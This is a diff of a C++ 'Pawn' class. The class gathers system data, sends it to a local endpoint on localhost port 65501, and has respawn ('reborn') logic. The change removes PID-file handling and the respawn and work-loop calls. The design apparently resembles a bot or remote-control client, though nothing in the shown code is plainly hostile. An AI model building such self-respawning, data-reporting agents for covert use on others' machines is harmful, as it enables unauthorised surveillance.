@@ -7,7 +7,6 @@
 #include <iostream>
 #include <fstream>
 #include "Pawn.h"
-#include <tlhelp32.h>
 
 
 
@@ -29,22 +28,22 @@ int Pawn::needReborn() {
     } else return 1;
 }
 
-int Pawn::readPidFile(std::string fname) {
-    std::ifstream fs(fname);
+//int Pawn::readPidFile(std::string fname) {
+//    std::ifstream fs(fname);
+//
+//    if (fs.fail()) return -1;
+//
+//    std::string line;
+//    fs >> line;
+//    int gotPid = std::stoi(line);
+//    printf("Got %d\n", gotPid);
+//    fs.close();
+//
+//    return gotPid;
+//
+//}
 
-    if (fs.fail()) return -1;
-
-    std::string line;
-    fs >> line;
-    int gotPid = std::stoi(line);
-    printf("Got %d\n", gotPid);
-    fs.close();
-
-    return gotPid;
-
-}
-
-void born() {
+int go() {
     std::string url = "localhost:65501";
     auto resp = myget(url);
 
@@ -74,33 +73,13 @@ void Pawn::doWork() {
     }
 }
 
-void Pawn::pidToFile(std::string fname) {
-    std::ofstream fs;
-    fs.open(fname);
-    fs << currentPID;
-    fs.close();
-}
-
-void Pawn::rmPidFile(std::string fname) {
-    std::remove(fname.c_str());
-
-    bool failed = !std::ifstream(fname);
-    if (failed) {
-        std::perror("Error opening deleted file");
-    }
-}
-
 Pawn::Pawn() {
     currentPID = getpid();
-    pidToFile("/tmp/pawn.pid");
 
     systemData = SystemDataCollector();
     int sendSystemDataResult = sendMyselfData();
-    reborn();
-    doWork();
+
 
 }
 
-Pawn::~Pawn() {
-    rmPidFile("/tmp/pawn.pid");
-}
+Pawn::~Pawn() { }
